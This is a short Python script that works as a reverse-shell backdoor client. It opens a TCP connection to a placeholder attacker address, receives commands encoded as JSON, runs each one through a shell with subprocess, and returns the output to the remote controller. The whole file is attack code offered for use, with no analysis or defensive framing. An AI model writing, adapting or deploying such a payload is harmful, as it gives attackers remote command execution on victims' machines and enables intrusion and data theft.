#!/usr/share/python3

# SOCKET
#      CONNECT

import socket
import subprocess
import json

def reliable_send(data):
	json_data = json.dumps(data).encode()
	sock.send(json_data)

def reliable_recv():
	json_data = ""
	while True:
		try:
			json_data = json_data + sock.recv(1024).decode()
			return json.loads(json_data)
		except ValueError:
			continue

def shell():
	while True:
		command = reliable_recv()
		if command == "q":
			break
		else:
			try:
				proc = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
				result = proc.stdout.read() + proc.stderr.read()
				reliable_send(result.decode())

			except:
				reliable_send("[!!] Can't Execute That Command")

sock = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
sock.connect(("ip",port))
print ("CONNECTION ESTABLISHED TO SERVER")
shell()
sock.close()
